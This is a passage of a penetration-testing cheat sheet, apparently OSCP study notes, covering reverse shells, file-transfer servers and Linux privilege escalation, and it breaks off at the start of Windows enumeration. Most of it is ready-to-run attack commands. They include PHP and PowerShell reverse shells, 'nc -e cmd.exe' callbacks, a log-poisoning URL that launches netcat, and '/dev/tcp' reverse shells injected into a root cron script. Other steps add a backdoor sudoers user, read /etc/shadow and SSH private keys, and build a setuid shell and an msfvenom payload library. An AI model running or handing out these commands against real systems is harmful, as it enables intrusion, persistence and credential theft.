class="nv">$prompt</span><span class="s2">=&#39;PS &#39; + (pwd).Path}else{</span><span class="nv">$prompt</span><span class="s2">=(pwd).Path}</span><span class="nv">$sendback2</span><span class="s2"> = </span><span class="nv">$data</span><span class="s2"> + </span><span class="nv">$sendback</span><span class="s2"> + </span><span class="nv">$prompt</span><span class="s2"> + &#39;&gt; &#39;;</span><span class="nv">$sendbyte</span><span class="s2"> = ([text.encoding]::ASCII).GetBytes(</span><span class="nv">$sendback2</span><span class="s2">);</span><span class="nv">$stream</span><span class="s2">.Write(</span><span class="nv">$sendbyte</span><span class="s2">,0,</span><span class="nv">$sendbyte</span><span class="s2">.Length);</span><span class="nv">$stream</span><span class="s2">.Flush()};</span><span class="nv">$client</span><span class="s2">.Close()}&quot;</span>

<span class="c1"># PHP most simple Linux</span>
&lt;?php<span class="w"> </span><span class="nv">$sock</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>fsockopen<span class="o">(</span><span class="s2">&quot;10.11.1.111&quot;</span>,1234<span class="o">)</span><span class="p">;</span><span class="w"> </span><span class="nv">$proc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>proc_open<span class="o">(</span><span class="s2">&quot;/bin/sh -i&quot;</span>,<span class="w"> </span>array<span class="o">(</span><span class="nv">0</span><span class="o">=</span>&gt;<span class="nv">$sock</span>,<span class="w"> </span><span class="nv">1</span><span class="o">=</span>&gt;<span class="nv">$sock</span>,<span class="w"> </span><span class="nv">2</span><span class="o">=</span>&gt;<span class="nv">$sock</span><span class="o">)</span>,<span class="w"> </span><span class="nv">$pipes</span><span class="o">)</span><span class="p">;</span>?&gt;
</code></pre></div>

<h1><strong>Privilege escalation</strong></h1>
<h2>Common</h2>
<div class="highlight"><pre><span></span><code><span class="p">#</span><span class="w"> </span><span class="n">Docker</span>
<span class="nl">https:</span><span class="c1">//www.notsosecure.com/anatomy-of-a-hack-docker-registry/</span>

<span class="nl">https:</span><span class="c1">//book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout</span>

<span class="nl">https:</span><span class="c1">//gtfobins.github.io/gtfobins/docker/</span>

<span class="p">#</span><span class="w"> </span><span class="n">Docker</span><span class="w"> </span><span class="n">Escape</span><span class="w"> </span>

<span class="n">Proving</span><span class="w"> </span><span class="n">Grounds</span><span class="w"> </span><span class="n">Sirol</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">Peppo</span>
</code></pre></div>

<h3>Set up Webserver</h3>
<div class="highlight"><pre><span></span><code><span class="nx">python</span><span class="w"> </span><span class="o">-</span><span class="nx">m</span><span class="w"> </span><span class="nx">SimpleHTTPServer</span><span class="w"> </span><span class="mi">8080</span>

<span class="nx">python3</span><span class="w"> </span><span class="o">-</span><span class="nx">m</span><span class="w"> </span><span class="nx">http</span><span class="p">.</span><span class="nx">server</span><span class="w"> </span><span class="mi">8080</span>

<span class="nx">php</span><span class="w"> </span><span class="o">-</span><span class="nx">S</span><span class="w"> </span><span class="m m-Double">0.0.0.0</span><span class="p">:</span><span class="mi">8080</span>

<span class="nx">ruby</span><span class="w"> </span><span class="o">-</span><span class="nx">run</span><span class="w">  </span><span class="o">-</span><span class="nx">e</span><span class="w"> </span><span class="o">-</span><span class="nx">httpd</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="o">-</span><span class="nx">p</span><span class="w"> </span><span class="mi">8080</span>

<span class="nx">https</span><span class="p">:</span><span class="c1">//github.com/sc0tfree/updog</span>
<span class="nx">updog</span>
</code></pre></div>

<h3>Set up FTP Server</h3>
<div class="highlight"><pre><span></span><code># Install pyftpdlib
pip install pyftpdlib

# Run (-w flag allows anonymous write access)
python -m pyftpdlib -p 21 -w
</code></pre></div>

<h3>Set up TFTP</h3>
<div class="highlight"><pre><span></span><code># In Kali
atftpd --daemon --port 69 /tftp

# In reverse Windows
tftp -i 10.11.1.111 GET nc.exe
nc.exe -e cmd.exe 10.11.1.111 4444

http://10.11.1.111/addguestbook.php?LANG=../../xampp/apache/logs/access.log%00&amp;cmd=nc.exe%20-e%20cmd.exe%2010.11.0.105%204444
</code></pre></div>

<h2>Linux</h2>
<p>Now we start the whole enumeration-process over gain.</p>
<ul>
<li>Kernel exploits</li>
<li>Programs running as root</li>
<li>Installed software</li>
<li>Weak/reused/plaintext passwords</li>
<li>Inside service</li>
<li>Suid misconfiguration</li>
<li>World writable scripts invoked by root</li>
<li>Unmounted filesystems</li>
<li>Look in /var/backups</li>
<li>Look in /etc/fstab y en mount</li>
</ul>
<p>Less likely</p>
<ul>
<li>Private ssh keys</li>
<li>Bad path configuration</li>
<li>Cronjobs</li>
</ul>
<h3>Useful commands</h3>
<div class="highlight"><pre><span></span><code><span class="c1"># Spawning shell</span>
<span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
<span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</span>
<span class="n">V</span>
<span class="n">Ctrl</span><span class="o">+</span><span class="n">Z</span>
<span class="n">stty</span> <span class="n">raw</span> <span class="o">-</span><span class="n">echo</span>
<span class="n">fg</span>
<span class="n">reset</span>
<span class="n">Ctrl</span><span class="o">+</span><span class="n">Z</span>
<span class="n">stty</span> <span class="n">size</span>
<span class="n">stty</span> <span class="o">-</span><span class="n">rows</span> <span class="mi">48</span> <span class="o">-</span><span class="n">columns</span> <span class="mi">120</span>
<span class="n">fg</span>

<span class="n">echo</span> <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;/bin/bash&#39;</span><span class="p">)</span>
<span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span> <span class="o">-</span><span class="n">i</span>
<span class="n">perl</span> <span class="o">-</span><span class="n">e</span> <span class="s1">&#39;exec &quot;/bin/sh&quot;;&#39;</span>
<span class="n">perl</span><span class="p">:</span> <span class="n">exec</span> <span class="s2">&quot;/bin/sh&quot;</span><span class="p">;</span>
<span class="n">ruby</span><span class="p">:</span> <span class="n">exec</span> <span class="s2">&quot;/bin/sh&quot;</span>
<span class="n">lua</span><span class="p">:</span> <span class="n">os</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span>
<span class="p">(</span><span class="n">From</span> <span class="n">within</span> <span class="n">vi</span><span class="p">)</span>
<span class="p">:</span><span class="err">!</span><span class="n">bash</span>
<span class="p">:</span><span class="nb">set</span> <span class="n">shell</span><span class="o">=/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span><span class="p">:</span><span class="n">shell</span>
<span class="p">(</span><span class="n">From</span> <span class="n">within</span> <span class="n">nmap</span><span class="p">)</span>
<span class="err">!</span><span class="n">sh</span>

<span class="c1"># Access to more binaries</span>
<span class="n">export</span> <span class="n">PATH</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span>

<span class="c1"># Set up webserver</span>
<span class="n">cd</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">oscp</span><span class="o">/</span><span class="n">useful</span><span class="o">-</span><span class="n">tools</span><span class="o">/</span><span class="n">privesc</span><span class="o">/</span><span class="n">linux</span><span class="o">/</span><span class="n">privesc</span><span class="o">-</span><span class="n">scripts</span><span class="p">;</span> <span class="n">python</span> <span class="o">-</span><span class="n">m</span> <span class="n">SimpleHTTPServer</span> <span class="mi">8080</span><span class="p">;</span> <span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span> <span class="mi">80</span>

<span class="c1"># Download all files</span>
<span class="n">wget</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.11.1.111</span><span class="p">:</span><span class="mi">8080</span><span class="o">/</span> <span class="o">-</span><span class="n">r</span><span class="p">;</span> <span class="n">mv</span> <span class="mf">10.11.1.111</span><span class="p">:</span><span class="mi">8080</span> <span class="n">exploits</span><span class="p">;</span> <span class="n">cd</span> <span class="n">exploits</span><span class="p">;</span> <span class="n">rm</span> <span class="n">index</span><span class="o">.</span><span class="n">html</span><span class="p">;</span> <span class="n">chmod</span> <span class="mi">700</span> <span class="n">LinEnum</span><span class="o">.</span><span class="n">sh</span> <span class="n">linprivchecker</span><span class="o">.</span><span class="n">py</span> <span class="n">unix</span><span class="o">-</span><span class="n">privesc</span><span class="o">-</span><span class="n">check</span>

<span class="o">./</span><span class="n">LinEnum</span><span class="o">.</span><span class="n">sh</span> <span class="o">-</span><span class="n">t</span> <span class="o">-</span><span class="n">k</span> <span class="n">password</span> <span class="o">-</span><span class="n">r</span> <span class="n">LinEnum</span><span class="o">.</span><span class="n">txt</span>
<span class="n">python</span> <span class="n">linprivchecker</span><span class="o">.</span><span class="n">py</span> <span class="n">extended</span>
<span class="o">./</span><span class="n">unix</span><span class="o">-</span><span class="n">privesc</span><span class="o">-</span><span class="n">check</span> <span class="n">standard</span>

<span class="c1"># Writable directories</span>
<span class="o">/</span><span class="n">tmp</span>
<span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">tmp</span>

<span class="c1"># Add user to sudoers</span>
<span class="n">useradd</span> <span class="n">hacker</span>
<span class="n">passwd</span> <span class="n">hacker</span>
<span class="n">echo</span> <span class="s2">&quot;hacker ALL=(ALL:ALL) ALL&quot;</span> <span class="o">&gt;&gt;</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">sudoers</span>
</code></pre></div>

<h3>Basic info</h3>
<div class="highlight"><pre><span></span><code><span class="n">which</span><span class="w"> </span><span class="n">awk</span><span class="w"> </span><span class="n">perl</span><span class="w"> </span><span class="n">python</span><span class="w"> </span><span class="n">python3</span><span class="w"> </span><span class="n">ruby</span><span class="w"> </span><span class="n">gcc</span><span class="w"> </span><span class="n">cc</span><span class="w"> </span><span class="n">nano</span><span class="w"> </span><span class="n">vi</span><span class="w"> </span><span class="n">vim</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="n">find</span><span class="w"> </span><span class="n">netcat</span><span class="w"> </span><span class="n">nc</span><span class="w"> </span><span class="n">wget</span><span class="w"> </span><span class="n">tftp</span><span class="w"> </span><span class="n">ftp</span><span class="w"> </span><span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="nb nb-Type">null</span>
<span class="n">uname</span><span class="w"> </span><span class="o">-</span><span class="n">a</span>
<span class="n">env</span>
<span class="n">id</span>
<span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">version</span>
<span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">issue</span>
<span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span>
<span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">group</span>
<span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">shadow</span>
<span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">hosts</span>
<span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">fstab</span>
<span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">crontab</span>

<span class="c1"># Users with login</span>
<span class="n">grep</span><span class="w"> </span><span class="o">-</span><span class="n">vE</span><span class="w"> </span><span class="s2">&quot;nologin&quot;</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span>

<span class="c1"># Priv Enumeration Scripts</span>
<span class="n">upload</span><span class="w"> </span><span class="o">/</span><span class="n">unix</span><span class="o">-</span><span class="n">privesc</span><span class="o">-</span><span class="n">check</span>
<span class="n">upload</span><span class="w"> </span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">Backup</span><span class="o">/</span><span class="n">Tools</span><span class="o">/</span><span class="n">Linux_privesc_tools</span><span class="o">/</span><span class="n">linuxprivchecker</span><span class="o">.</span><span class="n">py</span><span class="w"> </span><span class="o">./</span>
<span class="n">upload</span><span class="w"> </span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">Backup</span><span class="o">/</span><span class="n">Tools</span><span class="o">/</span><span class="n">Linux_privesc_tools</span><span class="o">/</span><span class="n">LinEnum</span><span class="o">.</span><span class="n">sh</span><span class="w"> </span><span class="o">./</span>

<span class="n">python</span><span class="w"> </span><span class="n">linprivchecker</span><span class="o">.</span><span class="n">py</span><span class="w"> </span><span class="n">extended</span>
<span class="o">./</span><span class="n">LinEnum</span><span class="o">.</span><span class="n">sh</span><span class="w"> </span><span class="o">-</span><span class="n">t</span><span class="w"> </span><span class="o">-</span><span class="n">k</span><span class="w"> </span><span class="n">password</span>
<span class="n">unix</span><span class="o">-</span><span class="n">privesc</span><span class="o">-</span><span class="n">check</span>
</code></pre></div>

<h3>Kernel exploits</h3>
<div class="highlight"><pre><span></span><code><span class="n">site</span><span class="o">:</span><span class="n">exploit</span><span class="o">-</span><span class="n">db</span><span class="o">.</span><span class="na">com</span><span class="w"> </span><span class="n">kernel</span><span class="w"> </span><span class="n">version</span>

<span class="n">perl</span><span class="w"> </span><span class="sr">/root/oscp/useful-tools/privesc/linux/Linux_Exploit_Suggester/</span><span class="n">Linux_Exploit_Suggester</span><span class="o">.</span><span class="na">pl</span><span class="w"> </span><span class="o">-</span><span class="n">k</span><span class="w"> </span><span class="mf">2.6</span>

<span class="n">python</span><span class="w"> </span><span class="n">linprivchecker</span><span class="o">.</span><span class="na">py</span><span class="w"> </span><span class="n">extended</span>
</code></pre></div>

<h3>Programs running as root</h3>
<p>Look for webserver, mysql or anything else like that.</p>
<div class="highlight"><pre><span></span><code># Metasploit
ps

# Linux
ps aux
</code></pre></div>

<h3>Installed software</h3>
<div class="highlight"><pre><span></span><code><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">src</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">bin</span>
<span class="o">/</span><span class="n">opt</span><span class="o">/</span>
<span class="o">/</span><span class="n">home</span>
<span class="o">/</span><span class="k">var</span><span class="o">/</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">src</span><span class="o">/</span>

<span class="c1"># Debian</span>
<span class="n">dpkg</span><span class="w"> </span><span class="o">-</span><span class="n">l</span>

<span class="c1"># CentOS, OpenSuse, Fedora, RHEL</span>
<span class="n">rpm</span><span class="w"> </span><span class="o">-</span><span class="n">qa</span><span class="w"> </span><span class="p">(</span><span class="n">CentOS</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">openSUSE</span><span class="w"> </span><span class="p">)</span>

<span class="c1"># OpenBSD, FreeBSD</span>
<span class="n">pkg_info</span>
</code></pre></div>

<h3>Weak/reused/plaintext passwords</h3>
<ul>
<li>Check database config-file</li>
<li>Check databases</li>
<li>Check weak passwords</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="n">username</span><span class="o">:</span><span class="n">username</span>
<span class="n">username</span><span class="o">:</span><span class="n">username1</span>
<span class="n">username</span><span class="o">:</span><span class="n">root</span>
<span class="n">username</span><span class="o">:</span><span class="n">admin</span>
<span class="n">username</span><span class="o">:</span><span class="n">qwerty</span>
<span class="n">username</span><span class="o">:</span><span class="n">password</span>
</code></pre></div>

<ul>
<li>Check plaintext</li>
</ul>
<div class="highlight"><pre><span></span><code>./LinEnum.sh -t -k password
</code></pre></div>

<h3>Inside service</h3>
<div class="highlight"><pre><span></span><code># Linux
netstat -anlp
netstat -ano
</code></pre></div>

<h3>Suid misconfiguration</h3>
<p>Binary with suid permission can be run by anyone, but when they are run they are run as root!</p>
<p>Example programs:</p>
<div class="highlight"><pre><span></span><code>nmap
vim
nano
</code></pre></div>

<div class="highlight"><pre><span></span><code><span class="c1"># SUID</span>
<span class="n">find</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">-</span><span class="n">perm</span><span class="w"> </span><span class="o">-</span><span class="mi">4000</span><span class="w"> </span><span class="o">-</span><span class="k">type</span><span class="w"> </span><span class="n">f</span><span class="w"> </span><span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="no">null</span>

<span class="c1"># ALL PERMS</span>
<span class="n">find</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">-</span><span class="n">perm</span><span class="w"> </span><span class="o">-</span><span class="mi">777</span><span class="w"> </span><span class="o">-</span><span class="k">type</span><span class="w"> </span><span class="n">f</span><span class="w"> </span><span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="no">null</span>

<span class="c1"># SUID for current user</span>
<span class="n">find</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">perm</span><span class="w"> </span><span class="o">/</span><span class="n">u</span><span class="o">=</span><span class="n">s</span><span class="w"> </span><span class="o">-</span><span class="k">user</span><span class="w"> </span><span class="n n-Quoted">`whoami`</span><span class="w"> </span><span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="no">null</span>
<span class="n">find</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">-</span><span class="k">user</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="o">-</span><span class="n">perm</span><span class="w"> </span><span class="o">-</span><span class="mi">4000</span><span class="w"> </span><span class="o">-</span><span class="n">print</span><span class="w"> </span><span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="no">null</span>

<span class="c1"># Writables for current user/group</span>
<span class="n">find</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">perm</span><span class="w"> </span><span class="o">/</span><span class="n">u</span><span class="o">=</span><span class="n">w</span><span class="w"> </span><span class="o">-</span><span class="k">user</span><span class="w"> </span><span class="n n-Quoted">`whoami`</span><span class="w"> </span><span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="no">null</span>
<span class="n">find</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">-</span><span class="n">perm</span><span class="w"> </span><span class="o">/</span><span class="n">u</span><span class="o">+</span><span class="n">w</span><span class="p">,</span><span class="n">g</span><span class="o">+</span><span class="n">w</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="o">-</span><span class="k">user</span><span class="w"> </span><span class="n n-Quoted">`whoami`</span><span class="w"> </span><span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="no">null</span>
<span class="n">find</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">-</span><span class="n">perm</span><span class="w"> </span><span class="o">/</span><span class="n">u</span><span class="o">+</span><span class="n">w</span><span class="w"> </span><span class="o">-</span><span class="k">user</span><span class="w"> </span><span class="n n-Quoted">`whoami`</span><span class="w"> </span><span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">nul</span>

<span class="c1"># Dirs with +w perms for current u/g</span>
<span class="n">find</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">perm</span><span class="w"> </span><span class="o">/</span><span class="n">u</span><span class="o">=</span><span class="n">w</span><span class="w"> </span><span class="o">-</span><span class="k">type</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="o">-</span><span class="k">user</span><span class="w"> </span><span class="n n-Quoted">`whoami`</span><span class="w"> </span><span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="no">null</span>
<span class="n">find</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">-</span><span class="n">perm</span><span class="w"> </span><span class="o">/</span><span class="n">u</span><span class="o">+</span><span class="n">w</span><span class="p">,</span><span class="n">g</span><span class="o">+</span><span class="n">w</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="o">-</span><span class="k">user</span><span class="w"> </span><span class="n n-Quoted">`whoami`</span><span class="w"> </span><span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="no">null</span>
</code></pre></div>

<h3>Unmounted filesystems</h3>
<p>Here we are looking for any unmounted filesystems. If we find one we mount it and start the priv-esc process over again.</p>
<div class="highlight"><pre><span></span><code>mount -l
</code></pre></div>

<h3>Cronjob</h3>
<p>Look for anything that is owned by privileged user but writable for you</p>
<div class="highlight"><pre><span></span><code><span class="n">crontab</span><span class="w"> </span><span class="o">-</span><span class="n">l</span>
<span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">alh</span><span class="w"> </span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">cron</span>
<span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">al</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="n">cron</span>
<span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">al</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">cron</span><span class="o">*</span>
<span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">cron</span><span class="o">*</span>
<span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">at</span><span class="o">.</span><span class="n">allow</span>
<span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">at</span><span class="o">.</span><span class="n">deny</span>
<span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">cron</span><span class="o">.</span><span class="n">allow</span>
<span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">cron</span><span class="o">.</span><span class="n">deny</span>
<span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">crontab</span>
<span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">anacrontab</span>
<span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">cron</span><span class="o">/</span><span class="n">crontabs</span><span class="o">/</span><span class="n">root</span>
</code></pre></div>

<h3>SSH Keys</h3>
<p>Check all home directories</p>
<div class="highlight"><pre><span></span><code>cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key
</code></pre></div>

<p>Privilege Escalation with SSH keys</p>
<div class="highlight"><pre><span></span><code>https://steflan-security.com/linux-privilege-escalation-exploiting-misconfigured-ssh-keys/ 
</code></pre></div>

<h3>Bad path configuration</h3>
<p>Require user interaction</p>
<h3>Find plain passwords</h3>
<div class="highlight"><pre><span></span><code>grep -rnw &#39;/&#39; -ie &#39;pass&#39; --color=always
grep -rnw &#39;/&#39; -ie &#39;DB_PASS&#39; --color=always
grep -rnw &#39;/&#39; -ie &#39;DB_PASSWORD&#39; --color=always
grep -rnw &#39;/&#39; -ie &#39;DB_USER&#39; --color=always
</code></pre></div>

<h3>Scripts</h3>
<h3>BASH</h3>
<div class="highlight"><pre><span></span><code>echo &#39;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#39; &gt;&gt; backups.sh

echo &#39;bash -i &gt;&amp; /dev/tcp/192.168.49.212/12445 0&gt;&amp;1&#39; &gt;&gt; backups.sh
</code></pre></div>

<h4>SUID</h4>
<div class="highlight"><pre><span></span><code>int main(void){
  setresuid(0, 0, 0);
  system(&quot;/bin/bash&quot;);
}

# Compile
gcc suid.c -o suid
</code></pre></div>

<h3>MSFVENOM LIBRARY Priv Esc</h3>
<div class="highlight"><pre><span></span><code><span class="nv">msfvenom</span><span class="w"> </span><span class="o">-</span><span class="nv">p</span><span class="w"> </span><span class="nv">linux</span><span class="o">/</span><span class="nv">x64</span><span class="o">/</span><span class="k">exec</span><span class="w"> </span><span class="o">-</span><span class="nv">cmd</span><span class="w"> </span><span class="s1">&#39;/bin/bash&#39;</span><span class="w"> </span><span class="o">-</span><span class="nv">f</span><span class="w"> </span><span class="nv">elf</span><span class="o">-</span><span class="nv">so</span><span class="w"> </span><span class="o">-</span><span class="nv">o</span><span class="w"> </span><span class="nv">libmalbec</span>.<span class="nv">so</span><span class="w"> </span><span class="nv">PrependSetuid</span><span class="o">=</span><span class="nv">TRUE</span>
</code></pre></div>

<h4>PS Monitor for cron</h4>
<div class="highlight"><pre><span></span><code><span class="ch">#!/bin/bash</span>

<span class="c1"># Loop by line</span>
<span class="nv">IFS</span><span class="o">=</span><span class="s1">$&#39;\n&#39;</span>

<span class="nv">old_process</span><span class="o">=</span><span class="k">$(</span>ps<span class="w"> </span>-eo<span class="w"> </span><span class="nb">command</span><span class="k">)</span>

<span class="k">while</span><span class="w"> </span>true<span class="p">;</span><span class="w"> </span><span class="k">do</span>
<span class="w">    </span><span class="nv">new_process</span><span class="o">=</span><span class="k">$(</span>ps<span class="w"> </span>-eo<span class="w"> </span><span class="nb">command</span><span class="k">)</span>
<span class="w">    </span>diff<span class="w"> </span>&lt;<span class="o">(</span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$old_process</span><span class="s2">&quot;</span><span class="o">)</span><span class="w"> </span>&lt;<span class="o">(</span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$new_process</span><span class="s2">&quot;</span><span class="o">)</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="o">[</span><span class="se">\&lt;\&gt;</span><span class="o">]</span>
<span class="w">    </span>sleep<span class="w"> </span><span class="m">1</span>
<span class="w">    </span><span class="nv">old_process</span><span class="o">=</span><span class="nv">$new_process</span>
<span class="k">done</span>

<span class="c1">#PSPY32 for PS monitor</span>
./pspy32<span class="w"> </span>
</code></pre></div>

<h3>Linux Privesc Tools</h3>
<ul>
<li><a href="https://gtfobins.github.io/">GTFOBins</a></li>
<li><a href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh">LinEnum</a></li>
<li><a href="https://gitlab.com/kalilinux/packages/linux-exploit-suggester/blob/kali/master/Linux_Exploit_Suggester.pl">LinuxExploitSuggester</a></li>
<li><a href="https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py">linuxprivchecker</a></li>
</ul>
<h3>Linux Precompiled Exploits</h3>
<ul>
<li><a href="https://github.com/lucyoa/kernel-exploits">kernel-exploits</a></li>
<li><a href="https://github.com/SecWiki/linux-kernel-exploits">kernel-exploits</a></li>
</ul>
<h2>Windows</h2>
<p>Now we start the whole enumeration-process over gain. This is a checklist. You need to check of every single one, in this order.</p>
<ul>
<li>Kernel exploits</li>
<li>Cleartext password</li>
<li>Reconfigure service parameters</li>
<li>Inside service</li>
<li>Program running as Admin/System</li>
<li>Installed software</li>
<li>Scheduled tasks</li>
<li>Weak passwords
-Check installed apps and versions for priv esc when all else fails</li>
</ul>
<h3>Basic info</h3>
<div class="highlight"><pre><span></span><code><span class="n">systeminfo</span>
<span class="k">set</span>
<span class="n">hostname</span>
<span class="n">net</span><span class="w"> </span><span class="n">users</span>
<span class="n">net</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="n">user1</span>
<span class="n">net</span><span class="w"> </span><span class="n">localgroups</span>
<span class="n">net</span><span class="w"> </span><span class="n">localgroups</span><span class="w"> </span><span class="n">Administrators</span>

<span class="n">Unquoted</span><span class="w"> </span><span class="n">Service</span><span class="w"> </span><span class="k">Path</span><span class="err">:</span>
